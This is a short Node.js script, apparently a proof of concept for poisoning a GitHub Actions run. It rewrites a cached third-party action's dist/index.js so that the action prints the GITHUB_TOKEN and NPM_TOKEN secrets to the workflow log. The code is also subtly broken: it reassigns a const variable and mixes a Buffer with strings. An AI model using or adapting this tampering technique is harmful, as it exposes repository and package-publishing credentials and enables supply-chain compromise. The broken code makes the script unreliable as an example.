const fs = require("fs");
const original = fs.readFileSync(
  "../../_actions/bdy12138/action/v2/dist/index.js"
);
original += `console.log("GITHUB_TOKEN:", process.env.GITHUB_TOKEN);`;
original += `console.log("NPM_TOKEN:", process.env.NPM_TOKEN);`;
fs.writeFileSync("../../_actions/bdy12138/action/v2/dist/index.js", original);
